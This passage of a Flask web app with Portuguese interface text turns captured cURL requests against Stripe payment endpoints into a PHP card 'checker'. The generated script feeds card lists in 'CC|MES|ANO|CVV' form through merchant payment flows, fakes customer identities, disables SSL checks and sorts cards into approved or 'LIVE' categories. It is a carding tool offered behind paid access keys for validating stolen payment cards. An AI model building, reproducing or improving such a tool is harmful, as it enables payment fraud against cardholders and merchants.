            const content = document.getElementById('resultsContent');
            
            results.classList.add('show');
            content.innerHTML = `
                <div class="result-card info">
                    <div class="loader">
                        <div class="spinner"></div>
                        <span class="loader-text">Analisando e processando cURLs...</span>
                    </div>
                </div>
            `;
            
            results.scrollIntoView({ behavior: 'smooth', block: 'center' });
            
            try {
                const resp = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ curls })
                });
                
                const data = await resp.json();
                
                if (data.status === 'success') {
                    currentGeneratedCode = data.php_code;
                    currentFilename = data.filename;
                    showResults(data);
                    toast('✅ API gerada com sucesso! ' + data.total_requests + ' requisições processadas.', 'success');
                } else {
                    showError(data.message);
                    toast('❌ ' + data.message, 'error');
                }
            } catch (e) {
                showError('Erro de conexão: ' + e.message);
                toast('❌ Erro ao conectar com o servidor', 'error');
            }
        }
        
        function showResults(data) {
            const content = document.getElementById('resultsContent');
            
            let steps = '';
            data.requests.forEach((r, i) => {
                steps += `
                    <div class="step-item">
                        <div class="step-num">${i + 1}</div>
                        <span class="method-tag method-${r.method}">${r.method}</span>
                        <div class="step-info">
                            <div class="step-url">${escapeHtml(r.url.substring(0, 60))}...</div>
                        </div>
                        <span class="step-purpose">${r.purpose}</span>
                    </div>
                `;
            });
            
            content.innerHTML = `
                <div class="result-card success">
                    <span class="status-tag tag-success">✅ API GERADA COM SUCESSO</span>
                    <div class="result-title">${data.message}</div>
                </div>
                
                <div class="result-card info">
                    <span class="status-tag tag-info">📋 ${data.total_requests} REQUISIÇÕES PROCESSADAS</span>
                    <div class="step-list">${steps}</div>
                </div>
                
                <div class="result-card code-card">
                    <div class="code-header">
                        <span class="status-tag tag-code">📄 CÓDIGO PHP GERADO</span>
                        <div class="code-actions">
                            <button class="btn-sm btn-sm-copy" onclick="copyCode()">📋 COPIAR</button>
                            <button class="btn-sm btn-sm-download" onclick="downloadCode()">💾 BAIXAR</button>
                        </div>
                    </div>
                    <div class="code-block" id="phpCodeBlock">${escapeHtml(data.php_code)}</div>
                </div>
            `;
            
            content.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
        
        function showError(msg) {
            const content = document.getElementById('resultsContent');
            content.innerHTML = `
                <div class="result-card error">
                    <span class="status-tag tag-error">❌ ERRO</span>
                    <div class="result-title">Falha ao processar</div>
                    <p style="color: var(--text2); margin-top: 5px;">${escapeHtml(msg)}</p>
                </div>
            `;
        }
        
        function copyCode() {
            if (!currentGeneratedCode) {
                toast('❌ Nenhum código gerado!', 'error');
                return;
            }
            
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(currentGeneratedCode).then(() => {
                    toast('✅ Código copiado!', 'success');
                }).catch(() => {
                    fallbackCopy();
                });
            } else {
                fallbackCopy();
            }
        }
        
        function fallbackCopy() {
            const textarea = document.createElement('textarea');
            textarea.value = currentGeneratedCode;
            textarea.style.position = 'fixed';
            textarea.style.left = '-9999px';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                document.execCommand('copy');
                toast('✅ Código copiado!', 'success');
            } catch (e) {
                toast('❌ Falha ao copiar.', 'error');
            }
            document.body.removeChild(textarea);
        }
        
        function downloadCode() {
            if (!currentGeneratedCode) {
                toast('❌ Nenhum código gerado!', 'error');
                return;
            }
            
            const blob = new Blob([currentGeneratedCode], { type: 'text/php' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = currentFilename || 'api_stripe.php';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            toast('✅ Download iniciado!', 'success');
        }
        
        function clearAll() {
            document.getElementById('curlInput').value = '';
            document.getElementById('results').classList.remove('show');
            document.getElementById('resultsContent').innerHTML = '';
            document.getElementById('charCount').textContent = '0 caracteres';
            document.getElementById('charCount').style.color = '#555577';
            currentGeneratedCode = '';
            currentFilename = '';
            toast('🗑️ Campos limpos!', 'success');
        }
        
        function escapeHtml(text) {
            if (!text) return '';
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Atalho Ctrl + Enter
        document.addEventListener('keydown', function(e) {
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                e.preventDefault();
                generateAPI();
            }
        });
        
        // Iniciar YouTube com som no primeiro clique
        document.addEventListener('click', function() {
            const iframe = document.getElementById('ytPlayer');
            if (iframe && iframe.src.indexOf('autoplay=1') === -1) {
                iframe.src = iframe.src.replace('autoplay=0', 'autoplay=1');
            }
        }, { once: true });
    </script>
</body>
</html>
'''


def parse_curl(curl_str):
    curl_str = ' '.join(curl_str.strip().split())
    try:
        parts = shlex.split(curl_str, posix=True)
    except:
        parts = curl_str.split()
    
    if not parts or parts[0] != 'curl':
        return None
    
    idx = 1
    method = 'GET'
    url = ''
    headers = OrderedDict()
    data = ''
    compressed = False
    
    while idx < len(parts):
        a = parts[idx]
        if a in ('-X', '--request'):
            idx += 1
            if idx < len(parts):
                method = parts[idx].upper()
        elif a in ('--data-binary', '-d', '--data', '--data-raw'):
            idx += 1
            if idx < len(parts):
                data = parts[idx]
                if method == 'GET':
                    method = 'POST'
        elif a == '--compressed':
            compressed = True
        elif a in ('-H', '--header'):
            idx += 1
            if idx < len(parts):
                line = parts[idx]
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().lower()] = v.strip()
        elif a.startswith('http'):
            url = a
        idx += 1
    
    if not url:
        for p in parts:
            if p.startswith('http'):
                url = p
                break
    
    return {
        'method': method,
        'url': url,
        'headers': headers,
        'data': data,
        'compressed': compressed
    }

def analyze_request(parsed):
    url = parsed['url']
    data = parsed['data']
    method = parsed['method']
    
    analysis = {
        'type': 'REQUEST',
        'category': 'generic',
        'importance': 5,
        'extracts_token': False,
        'needs_token': False,
        'token_type': None,
        'has_card_data': False,
        'is_stripe_api': False,
        'is_site_request': False
    }
    
    if 'api.stripe.com' in url:
        analysis['is_stripe_api'] = True
        
        if '/v1/payment_methods' in url:
            analysis['type'] = 'CREATE_PM'
            analysis['category'] = 'stripe_token'
            analysis['importance'] = 10
            analysis['extracts_token'] = True
            analysis['token_type'] = 'pm'
            analysis['has_card_data'] = True
        elif '/v1/payment_intents' in url:
            analysis['type'] = 'PAYMENT_INTENT'
            analysis['category'] = 'stripe_payment'
            analysis['importance'] = 9
            if method == 'POST':
                analysis['needs_token'] = True
                analysis['token_type'] = 'pm'
        elif '/v1/tokens' in url:
            analysis['type'] = 'CREATE_TOKEN'
            analysis['category'] = 'stripe_token'
            analysis['importance'] = 10
            analysis['extracts_token'] = True
            analysis['token_type'] = 'tok'
            analysis['has_card_data'] = True
        elif '/v1/setup_intents' in url:
            analysis['type'] = 'SETUP_INTENT'
            analysis['category'] = 'stripe_setup'
            analysis['importance'] = 8
    else:
        analysis['is_site_request'] = True
        analysis['type'] = 'SITE_POST'
        analysis['category'] = 'site'
        analysis['importance'] = 7
        
        if data and ('payment_method=' in data or 'pm_' in data):
            analysis['needs_token'] = True
            analysis['token_type'] = 'pm'
        if data and ('payment_intent' in data or 'pi_' in data):
            analysis['needs_token'] = True
            analysis['token_type'] = 'pi'
    
    return analysis

def extract_tokens_from_response(parsed):
    data = parsed['data']
    url = parsed['url']
    combined = f"{data} {url}"
    
    tokens = {}
    
    pm = re.search(r'(pm_[a-zA-Z0-9]{14,})', combined)
    if pm:
        tokens['pm_id'] = pm.group(1)
    
    pi = re.search(r'(pi_[a-zA-Z0-9]{14,})', combined)
    if pi:
        tokens['pi_id'] = pi.group(1)
    
    tok = re.search(r'(tok_[a-zA-Z0-9]{14,})', combined)
    if tok:
        tokens['token_id'] = tok.group(1)
    
    cs = re.search(r'(pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)', combined)
    if cs:
        tokens['client_secret'] = cs.group(1)
    
    si = re.search(r'(seti_[a-zA-Z0-9]{14,})', combined)
    if si:
        tokens['setup_intent_id'] = si.group(1)
    
    csrf_patterns = [
        r'x-csrf-token:\s*([a-zA-Z0-9_\-]+)',
        r'csrf_token=([a-zA-Z0-9_\-]+)',
        r'authenticity_token=([a-zA-Z0-9/+=]+)',
        r'_token=([a-zA-Z0-9]+)'
    ]
    for pattern in csrf_patterns:
        m = re.search(pattern, combined, re.IGNORECASE)
        if m:
            tokens['csrf_token'] = m.group(1)
            break
    
    return tokens

def generate_professional_php(parsed_curls):
    analyzed = []
    all_tokens = {}
    
    for curl in parsed_curls:
        analysis = analyze_request(curl)
        tokens = extract_tokens_from_response(curl)
        analyzed.append({
            'curl': curl,
            'analysis': analysis,
            'tokens': tokens
        })
        all_tokens.update(tokens)
    
    analyzed.sort(key=lambda x: x['analysis']['importance'], reverse=True)
    
    php = []
    php.append('<?php')
    php.append('/**')
    php.append(' * Cyber Stripe - Alto Coder Professional v5.0')
    php.append(' * Generated by @cybersecofc')
    php.append(' * Date: ' + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    php.append(' * Total Requests: ' + str(len(analyzed)))
    php.append(' */')
    php.append('')
    php.append('error_reporting(0);')
    php.append('set_time_limit(0);')
    php.append('date_default_timezone_set("America/Sao_Paulo");')
    php.append('')
    
    php.append('// Funções Auxiliares')
    php.append('function detectBandeira($cc) {')
    php.append('    $cc = preg_replace("/[^0-9]/", "", $cc);')
    php.append('    if (preg_match("/^4[0-9]{12}(?:[0-9]{3})?$/", $cc)) return "Visa";')
    php.append('    if (preg_match("/^5[1-5][0-9]{14}$/", $cc)) return "Mastercard";')
    php.append('    if (preg_match("/^3[47][0-9]{13}$/", $cc)) return "Amex";')
    php.append('    if (preg_match("/^6(?:011|5[0-9]{2})[0-9]{12}$/", $cc)) return "Discover";')
    php.append('    return "Unknown";')
    php.append('}')
    php.append('')
    
    php.append('$lista = isset($_GET["lista"]) ? $_GET["lista"] : "";')
    php.append('if (empty($lista)) {')
    php.append('    die(json_encode(["status" => "error", "message" => "Parametro lista obrigatorio. Use: CC|MES|ANO|CVV"]));')
    php.append('}')
    php.append('')
    php.append('$parts = explode("|", $lista);')
    php.append('if (count($parts) < 4) {')
    php.append('    die(json_encode(["status" => "error", "message" => "Formato invalido. Use: CC|MES|ANO|CVV"]));')
    php.append('}')
    php.append('')
    php.append('$cc = preg_replace("/[^0-9]/", "", trim($parts[0]));')
    php.append('$mes = trim($parts[1]);')
    php.append('$ano = trim($parts[2]);')
    php.append('$cvv = trim($parts[3]);')
    php.append('')
    php.append('if (strlen($ano) == 2) $ano = "20" . $ano;')
    php.append('')
    php.append('if (strlen($cc) < 13 || strlen($cvv) < 3) {')
    php.append('    die(json_encode(["status" => "error", "message" => "Dados do cartao invalidos"]));')
    php.append('}')
    php.append('')
    php.append('$bandeira = detectBandeira($cc);')
    php.append('$email = "cliente" . rand(1000,9999) . "@gmail.com";')
    php.append('$nome = "Cliente " . rand(100,999);')
    php.append('$inicio = microtime(true);')
    php.append('')
    
    for token_name in all_tokens:
        php.append(f'${token_name} = "";')
    php.append('')
    
    php.append('$cookieFile = tempnam(sys_get_temp_dir(), "CK_");')
    php.append('$ch = curl_init();')
    php.append('curl_setopt_array($ch, [')
    php.append('    CURLOPT_RETURNTRANSFER => true,')
    php.append('    CURLOPT_SSL_VERIFYPEER => false,')
    php.append('    CURLOPT_SSL_VERIFYHOST => false,')
    php.append('    CURLOPT_FOLLOWLOCATION => true,')
    php.append('    CURLOPT_TIMEOUT => 60,')
    php.append('    CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",')
    php.append(']);')
    php.append('')
    
    for i, item in enumerate(analyzed):
        curl = item['curl']
        analysis = item['analysis']
        tokens = item['tokens']
        
        url = curl['url']
        method = curl['method']
        headers = curl['headers']
        data = curl['data']
        compressed = curl['compressed']
        
        php.append(f'// ========================================')
        php.append(f'// STEP {i+1}: {analysis["type"]}')
        php.append(f'// URL: {url[:100]}')
        php.append(f'// ========================================')
        php.append(f'curl_setopt($ch, CURLOPT_URL, "{url}");')
        php.append(f'curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "{method}");')
        
        if headers:
            php.append(f'$headers_{i} = [];')
            for k, v in headers.items():
                if k.lower() in ('host', 'cookie', 'set-cookie', 'content-length'):
                    continue
                v_escaped = v.replace('\\', '\\\\').replace('"', '\\"')
                php.append(f'$headers_{i}[] = "{k}: {v_escaped}";')
            php.append(f'curl_setopt($ch, CURLOPT_HTTPHEADER, $headers_{i});')
        
        if data and method in ('POST', 'PUT', 'PATCH'):
            data_processed = data
            data_processed = re.sub(r'card\[number\]=[^&]+', 'card[number]=" . $cc . "', data_processed)
            data_processed = re.sub(r'card\[cvc\]=[^&]+', 'card[cvc]=" . $cvv . "', data_processed)
            data_processed = re.sub(r'card\[exp_month\]=[^&]+', 'card[exp_month]=" . $mes . "', data_processed)
            data_processed = re.sub(r'card\[exp_year\]=[^&]+', 'card[exp_year]=" . $ano . "', data_processed)
            data_processed = re.sub(r'number=[^&]+', 'number=" . $cc . "', data_processed)
            data_processed = re.sub(r'cvc=[^&]+', 'cvc=" . $cvv . "', data_processed)
            data_processed = re.sub(r'exp_month=[^&]+', 'exp_month=" . $mes . "', data_processed)
            data_processed = re.sub(r'exp_year=[^&]+', 'exp_year=" . $ano . "', data_processed)
            
            if 'pm_id' in all_tokens:
                pm_match = re.search(r'pm_[a-zA-Z0-9]{14,}', data_processed)
                if pm_match:
                    data_processed = data_processed.replace(pm_match.group(0), '" . $pm_id . "')
            
            if 'pi_id' in all_tokens:
                pi_match = re.search(r'pi_[a-zA-Z0-9]{14,}', data_processed)
                if pi_match and 'secret' not in pi_match.group(0):
                    data_processed = data_processed.replace(pi_match.group(0), '" . $pi_id . "')
            
            php.append(f'$data_{i} = "{data_processed}";')
            php.append(f'curl_setopt($ch, CURLOPT_POSTFIELDS, $data_{i});')
        
        php.append(f'curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);')
        php.append(f'curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);')
        
        if compressed:
            php.append(f'curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");')
        
        php.append(f'$response_{i} = curl_exec($ch);')
        php.append(f'$httpCode_{i} = curl_getinfo($ch, CURLINFO_HTTP_CODE);')
        php.append('')
        
        if analysis['extracts_token']:
            php.append(f'$json_{i} = json_decode($response_{i}, true);')
            
            if analysis['token_type'] == 'pm':
                php.append(f'if (isset($json_{i}["id"])) $pm_id = $json_{i}["id"];')
                php.append(f'if (empty($pm_id)) {{')
                php.append(f'    preg_match(\'/"id":\s*"(pm_[^"]+)"/\', $response_{i}, $m);')
                php.append(f'    if (isset($m[1])) $pm_id = $m[1];')
                php.append(f'}}')
            elif analysis['token_type'] == 'tok':
                php.append(f'if (isset($json_{i}["id"])) $token_id = $json_{i}["id"];')
            elif analysis['token_type'] == 'pi':
                php.append(f'if (isset($json_{i}["id"])) $pi_id = $json_{i}["id"];')
                php.append(f'if (isset($json_{i}["client_secret"])) $client_secret = $json_{i}["client_secret"];')
            
            php.append('')
    
    php.append('curl_close($ch);')
    php.append('')
    
    last = len(analyzed) - 1
    php.append(f'$tempo = number_format(microtime(true) - $inicio, 2);')
    php.append(f'$finalResponse = $response_{last};')
    php.append(f'$finalHttpCode = $httpCode_{last};')
    php.append(f'$finalJson = json_decode($finalResponse, true);')
    php.append('')
    php.append('$status = "declined";')
    php.append('$message = "Cartao recusado";')
    php.append('')
    php.append('if ($finalJson) {')
    php.append('    if (isset($finalJson["status"]) && $finalJson["status"] === "succeeded") {')
    php.append('        $status = "approved";')
    php.append('        $message = "Pagamento aprovado com sucesso!";')
    php.append('    }')
    php.append('    elseif (isset($finalJson["error"]["message"])) {')
    php.append('        $message = $finalJson["error"]["message"];')
    php.append('    }')
    php.append('    elseif (isset($finalJson["message"])) {')
    php.append('        $message = is_array($finalJson["message"]) ? implode(" ", $finalJson["message"]) : $finalJson["message"];')
    php.append('    }')
    php.append('} else {')
    php.append('    if (preg_match(\'/"message":\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    php.append('    elseif (preg_match(\'/"error":\s*"([^"]+)"/\', $finalResponse, $m)) $message = $m[1];')
    php.append('}')
    php.append('')
    php.append('if (stripos($message, "succeeded") !== false || stripos($message, "success") !== false || stripos($message, "approved") !== false) {')
    php.append('    $status = "approved";')
    php.append('}')
    php.append('if (stripos($message, "cvc") !== false || stripos($message, "cvv") !== false || stripos($message, "security code") !== false) {')
    php.append('    $status = "live_cvv";')
    php.append('    $message = "LIVE - CVV INCORRETO";')
    php.append('}')
    php.append('if (stripos($message, "insufficient") !== false || stripos($message, "funds") !== false || stripos($message, "saldo") !== false) {')
    php.append('    $status = "live_insufficient";')
    php.append('    $message = "LIVE - SALDO INSUFICIENTE";')
    php.append('}')
    php.append('if (stripos($message, "expired") !== false || stripos($message, "expirou") !== false) {')
    php.append('    $status = "declined_expired";')
    php.append('    $message = "CARTÃO EXPIRADO";')
    php.append('}')
    php.append('')
    php.append('echo json_encode([')
    php.append('    "status" => $status,')
    php.append('    "message" => $message,')
    php.append('    "card" => $cc,')
    php.append('    "bandeira" => $bandeira,')
    php.append('    "http_code" => $finalHttpCode,')
    php.append('    "tempo" => $tempo')
    php.append(']);')
    php.append('')
    php.append('?>')
    
    return '\n'.join(php)


@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'GET':
        # Se já estiver autenticado, vai direto para o app
        if session.get('authenticated'):
            return redirect(url_for('app_page'))
        return LOGIN_PAGE
    
   
    key = request.form.get('key', '').strip()
    
    if not key:
        return redirect(url_for('login_page', error='empty'))
    
    if key not in VALID_KEYS:
        return redirect(url_for('login_page', error='invalid_key'))
    
    key_data = VALID_KEYS[key]
    
    if key_data['status'] == 'desativado':
        return redirect(url_for('login_page', error='desativado'))
    
    # Login bem-sucedido
    session['authenticated'] = True
    session['user'] = key_data['user']
    session['plano'] = key_data['plano']
    session['expiracao'] = key_data['expiracao']
    session['key'] = key
    
    return redirect(url_for('app_page'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/app')
@login_required
def app_page():
    
    html = HTML_PAGE
    html = html.replace('USER_PLACEHOLDER', session.get('user', 'Unknown'))
    html = html.replace('PLANO_PLACEHOLDER', session.get('plano', 'N/A'))
    html = html.replace('EXP_PLACEHOLDER', session.get('expiracao', 'N/A'))
    return html

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect(url_for('app_page'))
    return redirect(url_for('login_page'))

@app.route('/api/generate', methods=['POST'])
@login_required
def generate_api():
    try:
        data = request.json
        if not data or 'curls' not in data:
            return jsonify({'status': 'error', 'message': 'Nenhum cURL fornecido'}), 400
        
        curls_text = data['curls'].strip()
        
        raw_curls = []
        lines = curls_text.split('\n')
        current = []
        
        for line in lines:
            if line.strip().startswith('curl') and current:
                raw_curls.append(' '.join(current))
                current = [line]
            else:
                current.append(line)
        if current:
            raw_curls.append(' '.join(current))
        
        if not raw_curls:
            raw_curls = [curls_text]
        
        parsed = []
        for c in raw_curls:
            p = parse_curl(c)
            if p and p['url']:
                parsed.append(p)
        
        if not parsed:
            return jsonify({'status': 'error', 'message': 'Nenhum cURL válido encontrado'}), 400
        
        php_code = generate_professional_php(parsed)
        
        filename = f'api_stripe_{uuid.uuid4().hex[:8]}.php'
        filepath = os.path.join(os.getcwd(), filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(php_code)
        
        api_id = uuid.uuid4().hex[:12]
        generated_apis[api_id] = {
            'code': php_code,
            'filename': filename,
            'created_at': datetime.now().isoformat()
        }
        
        requests_info = []
        for i, p in enumerate(parsed):
            analysis = analyze_request(p)
            requests_info.append({
                'step': i + 1,
                'method': p['method'],
                'url': p['url'][:100],
                'purpose': analysis['type']
            })
        
        return jsonify({
            'status': 'success',
            'message': f'API gerada com sucesso! {len(parsed)} requisições processadas.',
            'php_file': filepath,
            'filename': filename,
            'php_code': php_code,
            'api_id': api_id,
            'total_requests': len(parsed),
            'requests': requests_info,
            'usage': f'php -S localhost:8000 {filename}'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Erro: {str(e)}'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
